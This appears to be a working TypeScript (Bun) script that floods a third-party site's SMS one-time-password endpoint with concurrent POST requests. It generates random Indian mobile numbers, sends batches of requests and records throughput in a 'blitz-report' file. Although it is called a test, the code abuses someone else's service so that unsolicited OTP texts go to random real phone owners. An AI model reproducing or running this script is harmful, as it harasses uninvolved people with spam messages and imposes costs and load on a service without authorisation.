import { dns } from "bun";

dns.prefetch("reward-box.com");

const BASE_URL = "https://reward-box.com/rc_apk_otp_sms";
const DEFAULT_SOURCE = "DRSAPK94";

const ESSENTIAL_HEADERS = {
  "Content-Type": "application/x-www-form-urlencoded",
  "User-Agent": "Mozilla/5.0",
};

interface RequestConfig {
  phoneNumber: string;
  source?: string;
}

interface RequestResult {
  phoneNumber: string;
  status: number | "error";
}

interface TestReport {
  totalRequests: number;
  totalTimeMs: number;
  requestsPerSecond: number;
  successfulRequests: number;
  failedRequests: number;
  timestamp: number;
}

const createUrl = (phoneNumber: string, source: string): string => {
  return `${BASE_URL}?source=${source}&p1=91${phoneNumber}`;
};

const createBody = (phoneNumber: string): string => {
  return `number=91${phoneNumber}&sms=1`;
};

const generateRandomMobileNumbers = (count: number): string[] => {
  return Array.from({ length: count }, () => {
    const prefix = 6 + Math.floor(Math.random() * 4);
    const suffix = Math.floor(Math.random() * 1e9)
      .toString()
      .padStart(9, "0");
    return `${prefix}${suffix}`;
  });
};

async function makeRequest({
  phoneNumber,
  source = DEFAULT_SOURCE,
}: RequestConfig): Promise<RequestResult> {
  const url = createUrl(phoneNumber, source);
  const body = createBody(phoneNumber);

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: ESSENTIAL_HEADERS,
      body,
    });

    return { phoneNumber, status: response.status };
  } catch {
    return { phoneNumber, status: "error" };
  }
}

async function processBatch(
  numbers: string[],
  batchSize: number,
): Promise<RequestResult[]> {
  const results: RequestResult[] = [];
  for (let i = 0; i < numbers.length; i += batchSize) {
    const batch = numbers.slice(i, i + batchSize);
    try {
      const batchResults = await Promise.all(
        batch.map((phoneNumber) => makeRequest({ phoneNumber })),
      );
      results.push(...batchResults);
    } catch (error) {
      console.error("Batch request error:", error);
    }
  }
  return results;
}

async function blitzTest(count: number, batchSize = 100): Promise<void> {
  const startTime = Bun.nanoseconds();
  const numbers = generateRandomMobileNumbers(count);

  const results = await processBatch(numbers, batchSize);

  const endTime = Bun.nanoseconds();
  const totalTime = (endTime - startTime) / 1_000_000;
  const rps = count / (totalTime / 1000);

  const report: TestReport = {
    totalRequests: count,
    totalTimeMs: Math.round(totalTime),
    requestsPerSecond: Number(rps.toFixed(2)),
    successfulRequests: results.filter((r) => r.status === 200).length,
    failedRequests: results.filter((r) => r.status !== 200).length,
    timestamp: Date.now(),
  };
  console.log(Bun.inspect.table(report));
  await Bun.write(
    `blitz-report-${report.timestamp}.json`,
    JSON.stringify(report, null, 2),
  );
}

const count = parseInt(process.argv[2]) || 1000;
const batchSize = parseInt(process.argv[3]) || 100;

blitzTest(count, batchSize).catch(console.error);
